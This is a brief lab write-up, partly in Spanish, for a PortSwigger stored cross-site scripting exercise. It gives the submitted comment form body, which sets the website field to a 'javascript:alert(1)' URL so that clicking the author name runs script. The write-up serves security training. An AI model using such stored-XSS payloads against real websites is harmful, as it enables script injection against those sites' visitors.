# 8 - Anchor href attribute with double quotes HTML-encoded

> This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

Cambiamos el post de la website para ejecutar codigo js y listo:

```text
csrf=eVRawyL7nnb79R9NaJp18JzGbogTC86d&postId=8
&comment=aaa&name=Aguante+bokita+papa&email=boke%40boke.com
&website=javascript:alert(1)
```

